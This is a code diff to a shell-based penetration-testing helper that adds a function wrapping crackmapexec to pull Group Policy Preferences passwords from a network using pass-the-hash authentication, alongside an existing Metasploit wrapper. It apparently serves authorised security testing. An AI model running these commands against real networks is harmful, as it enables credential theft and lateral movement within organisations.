@@ -14,8 +14,8 @@ Commands
 --------
 nb-ad-gpp-install         installs dependencies
 nb-ad-gpp-msf             use metasploit module to look for the cPassword
-nb-ad-gpp-
-nb-ad-gpp-
+nb-ad-gpp-cme
+nb-ad-gpp-cme-autologin
 
 DOC
 }
@@ -47,4 +47,14 @@ nb-ad-gpp-msf() {
     echo "exploit" >> "$rc_file"
 
     print -z "msfconsole -n -q -r \"$rc_file\" "
+}
+
+nb-ad-gpp-cme() {
+    __check-project
+    __check-network
+	  __check-user
+    __ask "Enter the NT:LM SAM hash for authentication"
+    __check-hash
+
+    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M gpp_password"
 }
